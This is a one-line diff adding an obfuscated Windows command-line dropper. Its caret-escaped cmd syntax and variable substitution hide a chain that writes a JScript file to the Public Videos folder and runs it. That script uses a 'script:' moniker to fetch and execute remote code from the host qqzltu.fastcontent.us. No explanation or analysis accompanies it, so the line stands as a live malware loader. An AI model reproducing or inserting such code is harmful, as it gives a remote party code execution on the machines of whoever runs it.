@@ -1,0 +1,1 @@
+start /MIN %ComSpec% /V/D/c "se^T XQHJY=^еж^зи^й╗&&s^e^T SBC=%Public%\V^id^eos\^X3jDdII&&Se^t KNZUFC=tr^y^{^v6G7ar c='sc^ri^pt^:';d='h6G7Tt^P:';G6G7et^Ob^j6G7ec^t(c+d+'&&s^eT TNXA=L0pK6L0pK6qqzltu.fastcontent.usL0pK6?1L0pK6');}c^a^tch^(e^){^}^;&&s^e^T/^p MASJN="!KNZUFC:6G7=!!TNXA:L0pK6=/!"<n^ul > !SBC!.^j^S|ca^l^l s^t^a^rt !SBC!.j^S "|c^M^d
